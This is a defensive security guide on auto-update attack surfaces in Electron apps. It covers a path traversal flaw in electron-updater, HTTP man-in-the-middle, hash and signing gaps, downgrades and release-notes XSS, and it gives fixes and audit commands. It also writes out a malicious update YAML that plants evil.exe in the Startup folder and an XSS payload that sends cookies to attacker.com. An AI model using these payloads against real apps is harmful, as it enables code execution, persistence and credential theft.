---
title: Update Mechanism Attack Surface
description: Auto-update systems as a code execution attack surface — YAML parsing, download verification, and MitM
---

# Update Mechanism Attack Surface

The auto-updater is one of the highest-impact attack surfaces in any Electron app. It exists to download and execute code. If an attacker can control what gets downloaded — or where it gets written — they achieve code execution as a feature, not a bug.

Every Electron app that uses `electron-updater` has this surface. Every app that rolls its own update mechanism almost certainly has it in a worse state. And most developers who implement update checking think about it as an infrastructure problem, not a security one.

---

## electron-updater Overview

The most common update library for Electron apps, built into `electron-builder`:

```
Update Flow:
  App starts → check update server → download latest.yml →
  parse YAML → compare version → download binary/installer →
  verify SHA512 → extract/install → restart app
```

Each arrow is an attack surface. Let's go through the dangerous ones.

---

## CVE-2024-46992: Path Traversal in YAML Parsing

The most significant electron-updater vulnerability to date, found by Doyensec:

```yaml
# latest.yml — served by update server:
version: 1.2.3
files:
  - url: MyApp-1.2.3.exe
    sha512: LEGIT_HASH
    size: 12345
# Attacker-controlled path field:
path: "../../AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/evil.exe"
sha512: HASH_OF_EVIL
```

**The bug:** electron-updater used the `path` field from the YAML as the download destination filename, without stripping directory components. An attacker who controlled the update server could write the downloaded binary to `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\` — persistence on next login.

Note that the SHA512 hash check still passes: the attacker's YAML contains the hash of the attacker's binary. The hash is only meaningful if the YAML itself is trusted.

**The fix:** `path.basename()` to strip directory components:

```javascript
// Fixed version:
const fileName = path.basename(fileInfo.path);  // ← key fix
const targetPath = path.join(this.cacheDir, fileName);
```

```bash
# Check electron-updater version:
cat node_modules/electron-updater/package.json | grep '"version"'
# Vulnerable: < 6.3.0
# Fixed: >= 6.3.0
```

---

## HTTP Update Servers

Serving updates over HTTP enables trivial network interception. This isn't a sophisticated attack:

```yaml
# electron-builder.yml — DANGEROUS:
publish:
  provider: generic
  url: http://updates.myapp.com/  # HTTP → plaintext → interceptable
```

Anyone on the same network — same WiFi, corporate proxy, ISP-level — can intercept the `latest.yml` response and serve a modified YAML pointing to a malicious binary. The app downloads and installs it. RCE as the user.

```bash
# Find HTTP update URLs:
grep -rn "http://" --include="*.yml" --include="*.json" . | \
  grep -i "publish\|update\|release\|url" | grep -v "https://" | grep -v node_modules
```

---

## SHA512 — Only as Good as Its Source

The SHA512 check in `latest.yml` is the integrity verification. But the hash is in the same YAML file that the attacker controls. If the update server is compromised, the attacker controls both the binary AND its hash:

```yaml
# Attacker's latest.yml — hash matches malicious binary:
files:
  - url: MyApp-1.2.3.exe
    sha512: HASH_OF_MALICIOUS_BINARY  # Matches the malicious file
    size: 99999
```

The hash check passes. This is why code signing matters independently of hash verification — the signature can only be forged by someone with the developer's private key, not just anyone who can write to the update server.

---

## Code Signing Gaps

On Windows, electron-updater can verify Authenticode signatures:

```yaml
# electron-builder.yml:
win:
  publisherName: "MyCompany Inc"  # Checked against Authenticode
```

But gaps are common:

```yaml
# Misconfigured — accepts any signed binary:
publisherName: [""]  # Empty string = any signature
# Or:
# publisherName field missing entirely = no verification
```

On macOS, apps should be notarized. Gatekeeper checks happen on install, but a downloaded update that replaces an already-notarized app may not trigger re-verification.

---

## Downgrade Attacks

If the update server doesn't enforce version monotonicity:

```yaml
# Attacker's latest.yml:
version: 0.1.0  # Older version with known vulnerability
files:
  - url: MyApp-0.1.0.exe
    sha512: LEGIT_HASH_OF_OLD_VERSION
```

The app "updates" to an older version with known vulnerabilities. electron-updater has no built-in downgrade protection — apps must implement it themselves:

```javascript
autoUpdater.on('update-available', (info) => {
  if (semver.lte(info.version, app.getVersion())) {
    return;  // Reject — this is a downgrade
  }
  // proceed
});
```

---

## Release Notes XSS

Release notes come from the update server and are often rendered in the app UI. If they're rendered with `innerHTML`:

```javascript
// DANGEROUS:
autoUpdater.on('update-downloaded', (info) => {
  releaseNotesEl.innerHTML = info.releaseNotes;  // XSS from update server
});

// info.releaseNotes comes from latest.yml:
// releaseNotes: "<img src=x onerror=fetch('https://attacker.com/?t='+document.cookie)>"
```

XSS from release notes → if the app has privileged IPC handlers → privilege escalation.

```bash
# Find release notes rendering:
grep -rn "releaseNotes\|release_notes\|changelog" --include="*.js" . | \
  grep -v node_modules | grep -E "innerHTML\|insertAdjacentHTML\|dangerouslySet"
```

---

## Custom Update Implementations

Apps that roll their own update mechanism are almost always worse than electron-updater. Every line is a potential vulnerability:

```javascript
// Custom updater — every line is a potential sink:
const updateInfo = await fetch('https://api.myapp.com/update/check').then(r => r.json());
// updateInfo — SOURCE: network data

if (updateInfo.hasUpdate) {
  const binary = await fetch(updateInfo.downloadUrl);  // SOURCE: URL from server
  const buffer = await binary.arrayBuffer();
  
  // SHA256 of binary from the same server that served the binary:
  const sha = crypto.createHash('sha256').update(buffer).digest('hex');
  if (sha !== updateInfo.checksum) {  // Useless if server is compromised
    throw new Error('Integrity check failed');
  }
  
  fs.writeFileSync(updatePath, Buffer.from(buffer));  // SINK: write executable
  exec(updatePath);                                   // SINK: execute downloaded binary
}
```

---

## Update Mechanism Audit

```bash
# Check electron-updater version (CVE-2024-46992):
cat package.json | grep "electron-updater"
cat node_modules/electron-updater/package.json | grep '"version"'

# Find update server URLs:
grep -rn "publish\|updateUrl\|update.*url\|feedUrl" \
  --include="*.yml" --include="*.json" --include="*.js" . | \
  grep -v node_modules | grep -i "http\|url"

# Find release notes rendering:
grep -rn "releaseNotes\|release_notes\|changelog" --include="*.js" . | \
  grep -v "node_modules\|//" | grep -E "innerHTML\|insertAdjacentHTML\|dangerouslySet"

# Find custom update implementations:
grep -rn "autoUpdate\|auto_update\|selfUpdate\|updateManager" \
  --include="*.js" . | grep -v node_modules

# Find signature/hash checking:
grep -rn "sha512\|sha256\|checksum\|signature\|verify" --include="*.js" . | \
  grep -i "update\|download" | grep -v node_modules
```

---

## Risk Matrix

| Update Attack | Impact | Exploitability |
|--------------|--------|---------------|
| HTTP update server MitM | Critical | Easy (same-network attacker) |
| Compromised update server | Critical | Requires server access |
| Path traversal (CVE-2024-46992) | High | Requires server control |
| Release notes XSS | High | Requires server control |
| Downgrade attack | Medium | Requires server control |
| Missing code signature check | Critical | Enables unsigned update installs |
| SHA512 from same server | Low-Medium | Redundant when server is compromised |
